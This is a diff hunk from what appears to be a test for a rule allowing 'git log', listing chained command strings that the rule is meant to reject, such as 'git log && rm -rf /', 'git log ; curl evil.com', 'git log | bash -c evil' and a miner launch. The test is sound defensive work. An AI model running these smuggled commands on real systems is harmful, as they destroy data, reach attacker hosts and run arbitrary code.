@@ -37,7 +37,7 @@ describe("allow-git-log", () => {
       "git log && rm -rf /",
       "git log || echo pwned",
       "git log ; curl evil.com",
-      "git log | cat /etc/passwd",
+      "git log | bash -c evil",
       "git log & bitcoin-miner",
     ];
 
